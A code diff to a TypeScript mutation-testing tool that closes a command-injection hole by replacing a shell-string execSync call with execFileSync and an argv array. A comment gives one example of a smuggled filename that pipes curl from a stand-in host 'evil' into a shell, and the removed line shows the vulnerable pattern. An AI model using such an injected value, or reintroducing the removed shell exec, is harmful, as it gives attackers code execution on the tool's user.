@@ -58,7 +58,7 @@
 // --hotspots points at a text file, one repo-relative path per line (e.g. the M3 hotspot file
 // list), used to flag surviving mutants that sit on a security/perf hotspot as top priority.
 
-import { execSync, execFileSync } from "node:child_process";
+import { execFileSync } from "node:child_process";
 import { cpSync, existsSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { basename, dirname, isAbsolute, join, relative, resolve, sep } from "node:path";
@@ -400,7 +400,16 @@ if (stubCheck) {
   const loadSources = (root: string): SourceInput[] =>
     walkRelPaths(root).filter((p) => SOURCE_FILE.test(p)).map((rel) => readRel(root, rel));
 
-  const testCmd = arg("--test-cmd") ?? "npm test --";
+  // The test command is split into an argv (bin + base args) and NEVER goes through a shell:
+  // covering-test paths below are walked out of the untrusted target, and a filename may legally
+  // contain shell metacharacters (`x;curl evil|sh.test.ts`), so any shell-string exec here is
+  // RCE on the auditor (#765). Whitespace-tokenizing a target- or operator-supplied string is safe
+  // only because each token becomes a literal argv element — no token is ever shell-interpreted.
+  const [testBin, ...testBaseArgs] = (arg("--test-cmd") ?? "npm test --").trim().split(/\s+/);
+  if (!testBin) {
+    console.error("--test-cmd is empty");
+    process.exit(2);
+  }
 
   // #600: copy the target into a scratch dir the stubbing writes to, excluding the same heavy/
   // irrelevant dirs walkRelPaths already skips (node_modules is symlinked back in below rather
@@ -438,7 +447,7 @@ if (stubCheck) {
       const original = readFileSync(copyAbs, "utf8");
       writeFileSync(copyAbs, stub.stubbedText);
       try {
-        execSync(`${testCmd} ${tests.join(" ")}`, { cwd: copyDir, stdio: "ignore", env: suiteEnv });
+        execFileSync(testBin, [...testBaseArgs, ...tests], { cwd: copyDir, stdio: "ignore", env: suiteEnv });
         return true; // exit 0 with the body deleted — the suite survived
       } catch {
         return false;
